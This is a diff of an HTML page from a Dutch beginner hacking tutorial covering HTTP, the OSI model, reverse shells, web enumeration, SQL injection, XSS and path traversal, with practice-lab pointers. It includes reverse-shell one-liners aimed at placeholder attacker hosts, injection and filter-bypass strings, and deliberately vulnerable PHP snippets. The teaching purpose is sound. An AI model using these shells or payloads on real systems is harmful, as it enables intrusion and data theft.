@@ -289,26 +289,199 @@ img {
   max-width: 100%
 }
 </style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
 </head>
 <body>
-<h1>Voorwoord</h1>
+<h1 id="voorwoord">Voorwoord</h1>
 <p>In het kader van <a href="https://www.laatjeniethackmaken.nl" title="laatjeniethackmaken.nl">https://www.laatjeniethackmaken.nl</a> heb ik besloten om juist het tegenovergestelde te gaan maken. Gatochhacken.nl. Waarom ga toch hacken? Omdat er veel vragen zijn en mensen wel met security willen beginnen maar eigenlijk erg veel moeite hebben met het vinden van de juiste informatie in een voor hen begrijpelijke taal (Nederlands). </p>
 <p>Ik ga je niet leren hacken, dat is iets wat je zelf met veel oefening zal moeten doen. Het enige wat ik kan doen is begrippen uitleggen, de ene keer iets uitgebreider dan de andere, en je doorverwijzen naar bronwebsites waar je vervolginformatie kunt vinden. Het is onmogelijk om al deze informatie in één document te bundelen.</p>
 <p>Daarnaast verwacht ik van iemand die wil leren hacken dat er een zekere mate van intrinsieke nieuwsgierigheid aanwezig is en dat je jezelf wilt gaan inlezen. Om te voorkomen dat je afhaakt zal er wel wat text zijn om de linkjes aan elkaar te plakken. Deze pagina is overigens permanent under construction. Spot je een foutje, of heb je een verzoekje voor inhoud, maak dan een <a href="https://github.com/gatochhacken/gatochhacken.github.io/issues">issue</a> aan op <a href="https://www.github.com">github</a>.</p>
 <p><strong>LET OP</strong> alle technieken, code voorbeelden en andere informatie zijn technieken waarmee je kan hacken. Deze toepassen op een systeem waar jij geen toestemming hebt om dit te doen is een strafbaar feit! (artikel <a href="http://wetten.overheid.nl/jci1.3:c:BWBR0001854&amp;boek=Tweede&amp;titeldeel=V&amp;artikel=138ab">138ab</a> wetboek van strafrecht) Bega geen fout, wil je oefenen en dingen proberen, kijk dan op de website van <a href="https://www.certifiedsecure.com" title="Certified Secure">https://www.certifiedsecure.com</a></p>
-<h1>Protocollen</h1>
+<h1 id="protocollen">Protocollen</h1>
 <p>Het is ontzettend belangrijk dat je protocollen leert kennen, immers het kennen van protocollen zorgt voor een grotere flexibiliteit in aanvallen en een grotere onafhankelijkheid van tooling. Mocht je het protocol al kennen, dan kun je zelf eenvoudiger een tool schrijven die je bij een aanval ondersteund.</p>
-<h2>HTTP</h2>
-<p>Het <a href="https://tools.ietf.org/html/rfc7230">HTTP protocol</a> is een protocol die door veel gebruikers gebruikt wordt om op het internet pagina’s op te vragen. HTTP is een, relatief, eenvoudig plain-text protocol. 
-Binnen HTTP verstuurt een gebruiker een verzoek naar een webserver, dit verzoek ziet er bijvoorbeeld als volgt uit:</p>
+<h2 id="http">HTTP</h2>
+<p>Het <a href="https://tools.ietf.org/html/rfc7230">HTTP protocol</a> is een protocol die door veel gebruikers gebruikt wordt om op het internet pagina’s op te vragen. HTTP is een, relatief, eenvoudig plain-text protocol.<br>Binnen HTTP verstuurt een gebruiker een verzoek naar een webserver, dit verzoek ziet er bijvoorbeeld als volgt uit:</p>
 <pre><code>GET /index.php HTTP/1.1
 User-Agent: Firefox
 Host: www.voorbeeld.nl
 Accept-Language: en
-</code></pre>
-
-<p>In het bovengenoemde verzoek is GET de methode waarmee je een pagina opvraagt, daarachter staat de URI die je wilt opvragen en dan het protocol met de versienummer. Het User-Agent gedeelte is de browser die iemand gebruikt en de host het internet adres die een eindgebruiker wil bezoeken. Al deze velden kan jij als eindgebruiker beïnvloeden. Er bestaan overigens nog meer velden, maar daarvoor verwijs ik je graag naar de RFC zoals hierboven vermeld.
-Als reactie hierop stuurt de server het volgende antwoord:</p>
+</code></pre><p>In het bovengenoemde verzoek is GET de methode waarmee je een pagina opvraagt, daarachter staat de URI die je wilt opvragen en dan het protocol met de versienummer. Het User-Agent gedeelte is de browser die iemand gebruikt en de host het internet adres die een eindgebruiker wil bezoeken. Al deze velden kan jij als eindgebruiker beïnvloeden. Er bestaan overigens nog meer velden, maar daarvoor verwijs ik je graag naar de RFC zoals hierboven vermeld.<br>Als reactie hierop stuurt de server het volgende antwoord:</p>
 <pre><code>HTTP/1.1 200 OK
 Date: Thu, 3 May 2018 18:43:53 GMT
 Server: Apache
@@ -317,20 +490,16 @@ Content-Length: 73
 Content-Type: text/plain
 
 Hallo! Ik bedank je voor verzoek! Hier heb je mijn pagina als antwoord :)
-</code></pre>
-
-<p>Er zijn meerdere methoden om verzoeken naar webservers te sturen. Veel voorkomende methoden zijn:</p>
+</code></pre><p>Er zijn meerdere methoden om verzoeken naar webservers te sturen. Veel voorkomende methoden zijn:</p>
 <p><strong>POST</strong>, bedoeld om gegevens niet in de URL mee te sturen maar in de body van je request. Deze methode zullen goede developers gebruiken om logingegevens te verzenden. De met POST requests meegezonden data komen in de meeste webservers (zoals apache bij standaard instellingen) niet in de logging terug.</p>
 <p><strong>HEAD</strong>, doet hetzelfde als de hierboven genoemde GET request maar dan met als verschil dat de request body niet meegezonden wordt.</p>
-<p><strong>TRACE</strong>, met TRACE geeft de webserver de, door jou verzonden request headers weer zodat je kan zien of er tussen jou, en de webserver, nog aanpassingen gedaan zijn. 
-Start wireshark op je ingerichte lab machine en kijk eens wat er gebeurd als je met de request generator gaat spelen.</p>
-<h2><a href="https://tools.ietf.org/html/rfc959">FTP</a></h2>
-<h2><a href="https://tools.ietf.org/html/rfc792">ICMP</a></h2>
-<h2>OSI-model</h2>
+<p><strong>TRACE</strong>, met TRACE geeft de webserver de, door jou verzonden request headers weer zodat je kan zien of er tussen jou, en de webserver, nog aanpassingen gedaan zijn.<br>Start wireshark op je ingerichte lab machine en kijk eens wat er gebeurd als je met de request generator gaat spelen.</p>
+<h2 id="-ftp-https-tools-ietf-org-html-rfc959-"><a href="https://tools.ietf.org/html/rfc959">FTP</a></h2>
+<h2 id="-icmp-https-tools-ietf-org-html-rfc792-"><a href="https://tools.ietf.org/html/rfc792">ICMP</a></h2>
+<h2 id="osi-model">OSI-model</h2>
 <p>Alhoewel het OSI(Open Systems Interconnection)-model geen protocol is is het wel iets wat handig is om in je achterhoofd te houden als je iets wilt gaan doen met netwerk hacking. Het OSI-model bestaat uit 7 lagen. Hoe hoger de laag, des te dichter je bij de gebruiker aangekomen bent. Hieronder spits ik het toe op een TCP/IP stack, wil je iets anders hierover lezen dan is google een goede start. De lagen zijn als volgt:</p>
 <p><strong>Laag 1: Physical</strong></p>
-<p>De fysieke laag zorgt er voor dat de data die jij over een netwerk wilt verzenden ook daadwerkelijk op de kabel komt, en dat de data die mensen over het netwerk verzenden ook daadwerkelijk bij jouw systeem komt. Voorbeelden van deze protocollen zijn DSL, ISDN, CAN bus en WIFI. Als er iets ontvangen is, gaat deze informatie naar laag 2.
-Dit kun je vergelijken met het posten van de brief, of het uit de brievenbus halen van je brief.</p>
+<p>De fysieke laag zorgt er voor dat de data die jij over een netwerk wilt verzenden ook daadwerkelijk op de kabel komt, en dat de data die mensen over het netwerk verzenden ook daadwerkelijk bij jouw systeem komt. Voorbeelden van deze protocollen zijn DSL, ISDN, CAN bus en WIFI. Als er iets ontvangen is, gaat deze informatie naar laag 2.<br>Dit kun je vergelijken met het posten van de brief, of het uit de brievenbus halen van je brief.</p>
 <p><strong>Laag 2: Datalink</strong></p>
 <p>De datalink laag bepaald de manier hoe er gecommuniceerd word en met wie. In deze laag zul je ook vaak foutcorrectie vinden. Voorbeelden van protocollen op deze laag zijn ethernet, CHAP en ARP. Dit kan je vergelijken met een adres die op de enveloppe geschreven wordt of of afgelezen wordt. </p>
 <p><strong>Laag 3: (inter)Network</strong></p>
@@ -344,191 +513,166 @@ Dit kun je vergelijken met het posten van de brief, of het uit de brievenbus hal
 <p><strong>Laag 7: Application</strong></p>
 <p>De applicatielaag is de hoogste laag van het OSI model en deze laag ligt erg dicht bij een eindgebruiker en hij zal deze dan meestal ook het vaakst kennen. Binnen deze laag vallen protocollen als DNS, WEBDav, HTTP en FTP. Dit zijn protocollen waarmee computers direct met elkaar kunnen communiceren over de (met de lagere lagen) opgezette telecommunicatie- en computernetwerken.</p>
 <p>In laag 1 wordt de informatie uitgedrukt in bits, in laag 2 spreken we over frames. In laag 3 over packets en laag 4 over segments. Alles boven laag 4 is data.</p>
-<p>Er zijn diverse ezelsbruggetjes om het OSI-model te onthouden. Één hiervan is <em>All people should try new dairy products</em>	</p>
-<h1>Shells</h1>
-<h2>Reverse shell</h2>
+<p>Er zijn diverse ezelsbruggetjes om het OSI-model te onthouden. Één hiervan is <em>All people should try new dairy products</em>    </p>
+<h1 id="shells">Shells</h1>
+<h2 id="reverse-shell">Reverse shell</h2>
 <p>Alhoewel een volledig interactieve shell soms niet nodig is om je doel te bereiken, is het wel een van de krachtigste toegangen die je als hacker kan krijgen. Een reverse shell is wanneer een computer naar jou terug verbind en vervolgens zijn shell of command line aan jou ter beschikking stelt.</p>
 <p>Er zijn verschillende manieren om shells te bemachtigen, waaronder standaard met programmeertalen danwel de methodes met kant en klare agents.</p>
 <p>Hieronder zal ik er een aantal plaatsen:</p>
-<h3>Bash</h3>
+<h3 id="bash">Bash</h3>
 <pre><code>exec /bin/bash 0&amp;0 2&gt;&amp;0 
 bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
-</code></pre>
-
-<h3>Java</h3>
-<h3>Netcat</h3>
+</code></pre><h3 id="java">Java</h3>
+<h3 id="netcat">Netcat</h3>
 <pre><code>nc -e /bin/sh ATTACKING-IP 80
-</code></pre>
-
-<h3>Perl</h3>
-<pre><code>perl -e 'use Socket;$i=&quot;IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
-</code></pre>
-
-<h3><a href="https://www.php.net">PHP</a></h3>
-<pre><code>php -r '$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
-</code></pre>
-
-<h3>Ruby</h3>
-<h2>MSFVenom</h2>
+</code></pre><h3 id="perl">Perl</h3>
+<pre><code>perl -e &#39;use Socket;$i=&quot;IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+</code></pre><h3 id="-php-https-www-php-net-"><a href="https://www.php.net">PHP</a></h3>
+<pre><code>php -r &#39;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+</code></pre><h3 id="ruby">Ruby</h3>
+<h2 id="msfvenom">MSFVenom</h2>
 <p>Msfvenom is de payloadgenerator van het Metasploit Framework. Met deze payloadgenerator kan je eenvoudig code genereren die diverse soorten backdoors, reverse shells of andere toepassingen bieden. </p>
-<h3>Linux</h3>
-<h3>Mac</h3>
-<h3>Windows</h3>
-<h3>Android</h3>
-<h1>Web attacks</h1>
-<h2>Oefenomgeving</h2>
+<h3 id="linux">Linux</h3>
+<h3 id="mac">Mac</h3>
+<h3 id="windows">Windows</h3>
+<h3 id="android">Android</h3>
+<h1 id="web-attacks">Web attacks</h1>
+<h2 id="oefenomgeving">Oefenomgeving</h2>
 <p>Zoals eerder genoemd is certified secure een mooie omgeving om web attacks te oefenen. Je kan hiervoor ook de Damn Vulnerable Web Application (<a href="http://www.dvwa.co.uk/">DVWA</a>) gebruiken. De DVWA geeft een kwetsbare website waar je een heleboel van de hieronder genoemde technieken kan beoefenen. Je kan de DVWA in bijvoorbeeld <a href="https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html">vmware player</a> draaien.</p>
 <p>De standaard gebruikersnaam en wachtwoord zijn admin en password. Je kan deze gegevens ook proberen te bruteforcen.</p>
 <p><strong>Waarschuwing</strong> Draai DVWA <strong>nooit</strong> op een echte server. Het is echt zo kwetsbaar en je webserver zal snel overgenomen worden.</p>
-<h2>Enumeratie</h2>
+<h2 id="enumeratie">Enumeratie</h2>
 <p>Het is bijna onmogelijk om een onbeperkte lijst te geven van mogelijkheden waarop je binnen websites kan enumereren. Om hier toch een beeld te kunnen geven van welke gegevenssets je allemaal kan verzamelen van websites zullen er toch een niet limitatieve opsomming aan mogelijkheden gegeven worden.</p>
-<h3>Zoekmachinefuncties</h3>
+<h3 id="zoekmachinefuncties">Zoekmachinefuncties</h3>
 <p>Veel websites willen het zoekmachines graag makkelijker maken om geïndexeerd te worden, of soms juist voorkomen dat een zoekmachine bij sommige pagina’s kan komen. Je kan altijd kijken of er een zogenaamd <a href="http://www.robotstxt.org/">robots.txt</a> bestand is waarmee een beheerder de toegang tot bepaalde pagina’s wil beperken. Schrik niet als je hier de “geheime” paden naar de beheersinterface aantreft.</p>
 <p>Als je juist eenvoudig en met weinig verzoeken gebruikers wil enumereren of andere informatie wil verzamelen waarvan het juist de bedoeling is dat zoekmachines hierbij kunnen, kijk dan eens naar de <a href="https://en.wikipedia.org/wiki/Site_map">sitemap</a>. In een sitemap neemt een beheerder juist de pagina’s op waarvan hij graag wil dat je die gaat lezen.</p>
-<h3>Webpagina's</h3>
+<h3 id="webpagina-s">Webpagina&#39;s</h3>
 <p>Als je niet weet welke mappen of bestanden er allemaal bestaan kan je bij bekende softwarepakketten de installatiebestanden downloaden en deze installeren. Op deze manier kan je een beeld krijgen welke pagina’s er allemaal in een installatie horen te zitten en kan je er achter komen of er iets als een changelog (publiek) beschikbaar is waarmee je de versie van een applicatie kan achterhalen.</p>
-<h3>Dynamische pagina's</h3>
-<p>Tegenwoordig bevatten de meeste websites een content managment systeem. Deze content managment systemen maken het makkelijker om websites aan te maken en te beheren. Een beheerder hoeft geen HTML of CSS code meer te typen en kan eenvoudiger nieuwe pagina’s aan maken. Ook kan je vaak de inhoud van je website in eenzelfde omgeving typen als je van moderne tekstverwerkers gewend bent.
-Als je een website tegen komt waarbij dit het geval is, en je vervolgens ziet dat userprofielen op te vragen zijn met een getal, dan kan je potentieel alle gebruikersnamen verzamelen. </p>
-<p><strong>Voorbeeld wordpress:</strong>
-Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs te vergaren. Deze inlognamen worden gebruikt om op het wp-admin panel in te loggen. </p>
+<h3 id="dynamische-pagina-s">Dynamische pagina&#39;s</h3>
+<p>Tegenwoordig bevatten de meeste websites een content managment systeem. Deze content managment systemen maken het makkelijker om websites aan te maken en te beheren. Een beheerder hoeft geen HTML of CSS code meer te typen en kan eenvoudiger nieuwe pagina’s aan maken. Ook kan je vaak de inhoud van je website in eenzelfde omgeving typen als je van moderne tekstverwerkers gewend bent.<br>Als je een website tegen komt waarbij dit het geval is, en je vervolgens ziet dat userprofielen op te vragen zijn met een getal, dan kan je potentieel alle gebruikersnamen verzamelen. </p>
+<p><strong>Voorbeeld wordpress:</strong><br>Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs te vergaren. Deze inlognamen worden gebruikt om op het wp-admin panel in te loggen. </p>
 <p>http://<wordpress>/?author=<id></p>
 <p>Als je het id nummer op 1 zet krijg je de gebruikersnaam van de eerste aangemaakte Wordpress gebruiker. Dit zal vaak de administrator zijn.</p>
-<h3>Login formulieren</h3>
+<h3 id="login-formulieren">Login formulieren</h3>
 <p>Ook login formulieren kunnen een schat aan informatie prijs geven, zoals of een gebruiker bestaat en of je het juiste wachtwoord hebt. In het laatste geval zal je logischerwijs inloggen. Alhoewel het best practice is om aan te geven dat de gebruikersnaan en/of wachtwoord foutief ingevuld zijn geven sommige websites ook nog verschillende gegevens weer.</p>
-<p><img src="http://gatochhacken.nl/images/web_user_enumerate_gebruiker.png" /></p>
+<p><img src="http://gatochhacken.nl/images/web_user_enumerate_gebruiker.png" alt=""></p>
 <p>Je kan hier bijvoorbeeld zien dat je de gebruikersnaam niet goed hebt omdat de gebruiker niet bestaat.</p>
-<p><img src="http://gatochhacken.nl/images/web_user_enumerate_wachtwoord.png" /></p>
+<p><img src="http://gatochhacken.nl/images/web_user_enumerate_wachtwoord.png" alt=""></p>
 <p>Je kan hier bijvoorbeeld zien dat je de gebruikersnaam goed hebt, immers er is een dit wachtwoord is incorrect melding verschenen.</p>
-<p><img src="http://gatochhacken.nl/images/web_user_enumerate_geenconclussie.png" /></p>
+<p><img src="http://gatochhacken.nl/images/web_user_enumerate_geenconclussie.png" alt=""></p>
 <p>Aan dit veld kun je geen conclussies meer verbinden.</p>
-<h2>Client-side controle functionaliteiten</h2>
-<h3>Authenticatiefouten</h3>
-<h3>Sessie managment</h3>
-<h3>SQL</h3>
+<h2 id="client-side-controle-functionaliteiten">Client-side controle functionaliteiten</h2>
+<h3 id="authenticatiefouten">Authenticatiefouten</h3>
+<h3 id="sessie-managment">Sessie managment</h3>
+<h3 id="sql">SQL</h3>
 <p>Eenvoudige injectie </p>
-<p><code>' # --</code> </p>
+<p><code>&#39; # --</code> </p>
 <p>Indien het een username / password is en de query moet blijven werken:</p>
-<pre><code>' OR 1=1 OR 1='
-</code></pre>
-
-<h3>NoSQL</h3>
-<h3>XPath</h3>
-<h3>LDAP</h3>
-<h3>File uploads</h3>
-<h3>Fouten in de logica</h3>
-<h3>Cross site scripting</h3>
+<pre><code>&#39; OR 1=1 OR 1=&#39;
+</code></pre><h3 id="nosql">NoSQL</h3>
+<h3 id="xpath">XPath</h3>
+<h3 id="ldap">LDAP</h3>
+<h3 id="file-uploads">File uploads</h3>
+<h3 id="fouten-in-de-logica">Fouten in de logica</h3>
+<h3 id="cross-site-scripting">Cross site scripting</h3>
 <p>Cross site scripting (XSS) is een techniek waarbij je “slechte” gebruikersinvoer kunt plaatsen op een website. Deze invoer kan je vervolgens gebruiken om mensen te besmetten of om hun cookies / credentials te stelen. </p>
 <p>Sommige browsers zoals Chrome en Internet Explorer &gt;8.0 geven een foutmelding op het moment dat je XSS wilt uitvoeren. </p>
-<h4>Reflected XSS</h4>
+<h4 id="reflected-xss">Reflected XSS</h4>
 <p>Reflected of non-persistent XSS is een techniek waarbij een fout in de input sanitization het weergeven van kwaadaardige code toe staat. Het belangrijkste om te onthouden is dat in dit geval de aanval niet op de website opgeslagen is, en iemand dus alleen slachtoffer kan worden als hij echt jouw link aan klikt met de aanval.</p>
-<h4>PHP voorbeeld Reflected XSS</h4>
+<h4 id="php-voorbeeld-reflected-xss">PHP voorbeeld Reflected XSS</h4>
 <p>Het volgende code voorbeeld is kwetsbaar voor XSS </p>
-<p><code>php
-    &lt;?PHP
-    	if (isset($_GET['status']))
-    	{
-    		echo $_GET['status'];
-    	}
-    ?&gt;</code></p>
-<p>Als je dit in een php pagina zet, en deze PHP pagina bezoekt met als <a href="https://nl.wikipedia.org/wiki/Querystring">querystring</a> status=%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E zie je het volgende:</p>
-<p><img src="images/reflective_xss.png" /> </p>
+<pre><code>&lt;?PHP
+    if (isset($_GET[&#39;status&#39;]))
+    {
+        echo $_GET[&#39;status&#39;];
+    }
+?&gt;
+</code></pre><p>Als je dit in een php pagina zet, en deze PHP pagina bezoekt met als <a href="https://nl.wikipedia.org/wiki/Querystring">querystring</a> status=%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E zie je het volgende:</p>
+<p><img src="images/reflective_xss.png" alt=""> </p>
 <p><strong>Let op!</strong> de waarden zijn urlencoded om geen verstoring in de URL te geven. </p>
-<h4>Stored XSS</h4>
+<h4 id="stored-xss">Stored XSS</h4>
 <p>Stored of persistent XSS is een techniek waarbij een fout in de input sanitization het opslaan van je aanval mogelijk maakt. Dit soort aanvallen maken meer slachtoffers omdat iedereen die de specifieke pagina bezoekt er mee besmet zal worden.</p>
-<p><strong>DVWS voorbeeld</strong>
-<img src="images/xss_stored_alert(xss).png" />
-<img src="images/xss_stored_alert(xss)_result.png" /></p>
-<h4>DOM XSS</h4>
+<p><strong>DVWS voorbeeld</strong><br><img src="images/xss_stored_alert(xss" alt="">.png)<br><img src="images/xss_stored_alert(xss" alt="">_result.png)</p>
+<h4 id="dom-xss">DOM XSS</h4>
 <p>DOM (Document Object Model) XSS is een methode waarbij een aanvaller de kwaadaardige code op zo een manier plaatst dat het nooit via de webserver loopt. Dit kan bijvoorbeeld als <a href="https://nl.wikipedia.org/wiki/JavaScript">javascript</a> gebruik maakt van de URL van een webpagina zonder hierop een juiste input sanitization te doen.</p>
-<h2>Local file inclusion</h2>
+<h2 id="local-file-inclusion">Local file inclusion</h2>
 <p>LFI is een aanvalstechniek die volledig Local File Inclusion heet. Het is een kwetsbaarheid waarbij een applicatie gebruikersinvoer niet op een juiste wijze bewerkt. Door deze kwetsbaarheid te misbruiken krijg je de mogelijkheid om bestanden in te laden waar dit (eigenlijk) niet de bedoeling was. Op deze manier kan je potentieel bestanden lezen als /etc/passwd of andere gevoelige bestanden.</p>
 <p>File includes zijn redelijk te herkennen aan de parameters achter een pagina naam. Denk hierbij aan een GET parameter als file of page. Vaak zie je hier dan een bestandsnaam staan. In de submappen zijn enkele opdrachten te vinden waarmee je zelf met LFI kunt spelen.</p>
-<h2>Path traversal</h2>
+<h2 id="path-traversal">Path traversal</h2>
 <p>Path Traversal wordt ook wel Directory Traversal genoemd. Eigenlijk is dit niets anders dan in een regulier Linux filesystem navigeren. Als je iets in een andere map wilt zoeken zul je hier naar toe moeten navigeren op een manier zoals je dat op de command line ook doet. Als je test.txt wilt weergeven die een map hoger in de directory structuur staat kan je “cat ../test.txt” gebruiken.</p>
 <p>Je kan op deze manier geen sources van PHP bestanden in zien. PHP bestanden worden door de PHP functies <a href="https://www.php.net/include">include</a> en <a href="https://www.php.net/require">require</a> ingeladen en geparsed. Hierdoor zal je hetzelfde zien als wat je ziet als je de pagina rechtstreeks bezoekt.</p>
-<p>In sommige gevallen gebruiken mensen een WAF of hebben ze zelf scripting geschreven die opgegeven path's op hun inhoud filteren. Lang niet alle implementaties die mensen verzinnen geven een goede filtering. </p>
+<p>In sommige gevallen gebruiken mensen een WAF of hebben ze zelf scripting geschreven die opgegeven path&#39;s op hun inhoud filteren. Lang niet alle implementaties die mensen verzinnen geven een goede filtering. </p>
 <p>Om bepaalde filters te omzeilen kan je bijvoorbeeld je path url encoden of tweemaal url encoden. Dit geeft in die volgorde de volgende resultaten:</p>
 <pre><code>../
 %2e%2e%2f
 %252e%252e%252f
-</code></pre>
-
-<p>Ook kan je je path traversal in unicode opgeven uit de hoop dat een ontvangende applicatie hier niet correct mee om kan gaan. In sommige gevallen filteren scripts op <em>../</em> . Je kan dan ook eens een andere slash gebruiken dan die je net gebruikte. </p>
+</code></pre><p>Ook kan je je path traversal in unicode opgeven uit de hoop dat een ontvangende applicatie hier niet correct mee om kan gaan. In sommige gevallen filteren scripts op <em>../</em> . Je kan dan ook eens een andere slash gebruiken dan die je net gebruikte. </p>
 <p>Mochten ze onverhoopt ../ en ..\ er uit filteren zoals in het volgende code voorbeeld:</p>
 <pre><code>&lt;?PHP
-    $path = $_GET['path'];
-    $path = ereg_replace('\.\./','',$path);
-    $path = ereg_replace('\.\./','',$path);
+    $path = $_GET[&#39;path&#39;];
+    $path = ereg_replace(&#39;\.\./&#39;,&#39;&#39;,$path);
+    $path = ereg_replace(&#39;\.\./&#39;,&#39;&#39;,$path);
     echo $path;
 ?&gt;
-</code></pre>
-
-<p>Dan kan je bijvoorbeeld de volgende string opgeven:</p>
+</code></pre><p>Dan kan je bijvoorbeeld de volgende string opgeven:</p>
 <pre><code>...\.\
-</code></pre>
-
-<p>PHP zal in dat geval eerst de ..\ er uit filteren, en dan houd je alsnog een correcte path traversal over. </p>
-<h3>Simpele beveiliging</h3>
+</code></pre><p>PHP zal in dat geval eerst de ..\ er uit filteren, en dan houd je alsnog een correcte path traversal over. </p>
+<h3 id="simpele-beveiliging">Simpele beveiliging</h3>
